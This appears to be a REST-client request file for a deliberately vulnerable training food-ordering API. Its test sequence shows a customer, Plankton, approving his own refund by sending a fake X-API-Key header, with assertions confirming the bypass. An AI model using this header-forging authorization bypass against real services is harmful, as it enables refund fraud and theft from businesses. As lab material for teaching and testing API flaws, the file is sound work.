# @import ../common/setup.http
@host = {{base_host}}/v203

# Sandy adds a new feature: now customers can check their refund status
# Restaurant managers can approve or reject refunds themselves
# (previously this was done by Sandy herself, manually)

### Record Plankton's balance
# @name initial_balance
GET /account/credits
Authorization: {{plankton_auth}}

### Plankton places an order and requests a refund
# @name cart
POST /cart
Authorization: {{plankton_auth}}

###
POST /cart/{{cart.cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": "6" }

###
# @name order
POST /cart/{{cart.cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

tip=1&delivery_address=Chum Bucket


### Verify that Plankton's balance now is lower than it was before the order
GET /account/credits
Authorization: {{plankton_auth}}

?? js parseFloat(response.parsedBody.balance) < {{parseFloat(initial_balance.balance)}}


### Plankton requests a refund as soon as the order is delivered
# @name refund_request
POST /orders/{{order.order_id}}/refund
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

amount={{order.total}}


### --- Legitimate Usage: Restaurant manager rejects Plankton's refund request ---
//PATCH /orders/{{order.order_id}}/refund/status
//X-API-Key: {{krabs_api_key}}
//Content-Type: application/x-www-form-urlencoded
//
//status=rejected
//
//?? status == 200
//?? js response.parsedBody.status == rejected


### Plankton approves his own refund with his customer credentials and a fake API key
# --- Exploit: Plankton can approve his own refund request by sending a fake X-API-Key header ---
PATCH /orders/{{order.order_id}}/refund/status
Authorization: {{plankton_auth}}
X-API-Key: trust_me_bro
Content-Type: application/x-www-form-urlencoded

status=approved

?? status == 200
?? js response.parsedBody.status == approved


### Plankton's balance is back to where it started
GET /account/credits
Authorization: {{plankton_auth}}

?? js parseFloat(response.parsedBody.balance) == {{parseFloat(initial_balance.balance)}}
